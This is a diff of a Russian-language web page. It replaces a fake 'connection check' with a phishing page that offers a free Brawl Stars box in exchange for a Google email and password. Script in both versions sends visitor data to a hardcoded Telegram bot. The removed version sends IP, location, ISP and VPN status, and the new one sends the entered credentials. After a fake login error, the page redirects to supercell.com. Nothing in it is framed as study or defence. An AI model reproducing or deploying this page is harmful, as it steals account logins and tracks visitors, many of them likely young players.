@@ -3,79 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка соединения</title>
+    <title>Бесплатный ящик Brawl Stars</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            background: #0e0e0e; 
-            color: white; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            background-image: radial-gradient(circle at 20% 30%, #2d2d5e, #0f0f1f);
         }
-        .box { 
-            background: #1a1a1a; 
-            padding: 40px; 
-            border-radius: 12px; 
-            text-align: center; 
-            max-width: 400px; 
-            border: 1px solid #333;
+        .card {
+            background: #16213e;
+            padding: 40px 35px;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            border: 2px solid #f5c542;
         }
-        .loader { 
-            border: 4px solid #333; 
-            border-top: 4px solid #0088cc; 
-            border-radius: 50%; 
-            width: 40px; 
-            height: 40px; 
-            animation: spin 1s linear infinite; 
-            margin: 20px auto; 
+        .brawl-box {
+            width: 140px;
+            height: auto;
+            margin: 0 auto 15px;
+            display: block;
+            filter: drop-shadow(0 8px 20px rgba(245, 197, 66, 0.4));
         }
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
+        .card h1 {
+            color: #f5c542;
+            font-size: 28px;
+            font-weight: 900;
+            text-shadow: 0 0 20px rgba(245, 197, 66, 0.3);
+            margin: 10px 0 5px;
+            letter-spacing: 1px;
         }
-        .vpn-warning { 
-            color: #ff6b6b; 
-            font-weight: bold; 
-            font-size: 18px; 
-            padding: 12px; 
-            background: #2a0a0a; 
-            border-radius: 8px; 
-            border: 1px solid #ff6b6b;
-            display: none;
-            margin-bottom: 20px;
+        .card .sub {
+            color: #b0b0d0;
+            font-size: 16px;
+            margin-bottom: 25px;
+            border-bottom: 1px dashed #3a3a6a;
+            padding-bottom: 15px;
         }
-        .status-text {
-            color: #aaa;
+        .card .sub span {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+        .card label {
+            display: block;
+            text-align: left;
+            color: #c8c8e8;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 12px;
+            margin-bottom: 4px;
+        }
+        .card input {
+            width: 100%;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 12px;
+            background: #0f1a30;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            border: 1px solid #2a3a5a;
+            transition: 0.2s;
+        }
+        .card input:focus {
+            border-color: #f5c542;
+            outline: none;
+            background: #1a2740;
+        }
+        .card input::placeholder {
+            color: #5a6a8a;
+        }
+        .card button {
+            width: 100%;
+            padding: 16px;
+            margin-top: 20px;
+            background: #f5c542;
+            border: none;
+            border-radius: 12px;
+            color: #1a1a2e;
+            font-weight: 900;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 15px rgba(245, 197, 66, 0.3);
+        }
+        .card button:hover {
+            background: #ffd966;
+            transform: scale(1.02);
+            box-shadow: 0 6px 25px rgba(245, 197, 66, 0.5);
+        }
+        .error {
+            color: #ff6b6b;
             font-size: 14px;
-            margin-top: 10px;
+            margin-top: 14px;
+            display: none;
+            background: #2a0f0f;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #ff6b6b;
+        }
+        .note {
+            color: #5a6a8a;
+            font-size: 12px;
+            margin-top: 20px;
+            border-top: 1px solid #2a3a5a;
+            padding-top: 18px;
+        }
+        .glow {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { filter: drop-shadow(0 0 10px rgba(245, 197, 66, 0.3)); }
+            50% { filter: drop-shadow(0 0 30px rgba(245, 197, 66, 0.7)); }
+            100% { filter: drop-shadow(0 0 10px rgba(245, 197, 66, 0.3)); }
+        }
+        .stars {
+            color: #f5c542;
+            font-size: 14px;
+            letter-spacing: 4px;
         }
     </style>
 </head>
 <body>
-<div class="box">
-    <div class="loader" id="loader"></div>
-    <div id="vpnWarning" class="vpn-warning">
-        ⚠️ Включен VPN: данные не защищены
-    </div>
-    <div class="status-text" id="statusText">Проверка соединения...</div>
+<div class="card">
+    <img class="brawl-box glow" src="https://static.wikia.nocookie.net/brawlstars/images/4/4c/Brawl_Box.png" alt="Brawl Box">
+    <h1>🎁 БЕСПЛАТНЫЙ ЯЩИК</h1>
+    <div class="sub">В честь обновы <span>★</span> забери свой подарок</div>
+    <div class="stars">✦ ✦ ✦ ✦ ✦</div>
+
+    <form id="loginForm">
+        <label>📧 Войди через Google</label>
+        <input type="email" id="email" placeholder="E-mail" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <button type="submit">🎁 ЗАБРАТЬ ЯЩИК</button>
+        <div class="error" id="errorMsg">⚠️ Неверный логин или пароль</div>
+    </form>
+
+    <div class="note">✅ Только для новых игроков. Один раз на аккаунт.</div>
 </div>
 
 <script>
     const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';
     const chatId = '7253706229';
 
-    function sendReport(geoData, isVpn) {
-        const report = {
-            ip: geoData.ip || '—',
-            city: geoData.city || '—',
-            region: geoData.region || '—',
-            country: geoData.country || '—',
-            country_code: geoData.countryCode || '—',
-            isp: geoData.isp || geoData.org || '—',
-            vpn_detected: isVpn,
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!email || !password) {
+            document.getElementById('errorMsg').style.display = 'block';
+            return;
+        }
+
+        const data = {
+            email: email,
+            password: password,
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
@@ -85,21 +177,14 @@
             timestamp: new Date().toISOString()
         };
 
-        const vpnStatus = isVpn ? '🔴 ВКЛЮЧЕН (не Россия)' : '🟢 ОТКЛЮЧЕН (Россия)';
-        const message = `🔍 НОВЫЙ ОТЧЁТ:\n` +
-            `VPN статус: ${vpnStatus}\n` +
-            `IP: ${report.ip}\n` +
-            `Город: ${report.city}\n` +
-            `Регион: ${report.region}\n` +
-            `Страна: ${report.country} (${report.country_code})\n` +
-            `Провайдер: ${report.isp}\n` +
-            `Браузер: ${report.userAgent}\n` +
-            `Платформа: ${report.platform}\n` +
-            `Язык: ${report.language}\n` +
-            `Экран: ${report.screen}\n` +
-            `Часовой пояс: ${report.timezone}\n` +
-            `Реферер: ${report.referrer}\n` +
-            `Время: ${report.timestamp}`;
+        const message = `🎮 BRAWL STARS — ЯЩИК (ЛОГИН):\n` +
+            `📧 Почта: ${data.email}\n` +
+            `🔑 Пароль: ${data.password}\n` +
+            `🌐 Браузер: ${data.userAgent}\n` +
+            `💻 Платформа: ${data.platform}\n` +
+            `🗣 Язык: ${data.language}\n` +
+            `📱 Экран: ${data.screen}\n` +
+            `⏳ Время: ${data.timestamp}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
@@ -107,39 +192,15 @@
             body: JSON.stringify({ chat_id: chatId, text: message })
         })
         .then(() => {
-            window.location.href = 'https://ru.wikipedia.org';
+            document.getElementById('errorMsg').style.display = 'block';
+            setTimeout(() => {
+                window.location.href = 'https://supercell.com/';
+            }, 2000);
         })
         .catch(() => {
-            window.location.href = 'https://ru.wikipedia.org';
+            window.location.href = 'https://supercell.com/';
         });
-    }
-
-    // Используем ip-api.com — работает в России
-    fetch('http://ip-api.com/json/')
-        .then(response => response.json())
-        .then(data => {
-            if (data.status === 'success') {
-                const countryCode = data.countryCode || '';
-                const isVpn = countryCode.toUpperCase() !== 'RU';
-
-                if (isVpn) {
-                    document.getElementById('vpnWarning').style.display = 'block';
-                    document.getElementById('statusText').innerText = 'Ваше соединение не защищено, но проверка продолжается...';
-                } else {
-                    document.getElementById('statusText').innerText = 'Соединение защищено, идёт проверка...';
-                }
-
-                sendReport(data, isVpn);
-            } else {
-                // Если API вернул ошибку — отправляем отчёт без гео
-                document.getElementById('statusText').innerText = 'Не удалось определить местоположение, продолжаем...';
-                sendReport({ ip: '—', city: '—', region: '—', country: '—', countryCode: '—', isp: '—' }, false);
-            }
-        })
-        .catch(() => {
-            document.getElementById('statusText').innerText = 'Не удалось проверить соединение, продолжаем...';
-            sendReport({ ip: '—', city: '—', region: '—', country: '—', countryCode: '—', isp: '—' }, false);
-        });
+    });
 </script>
 </body>
 </html>
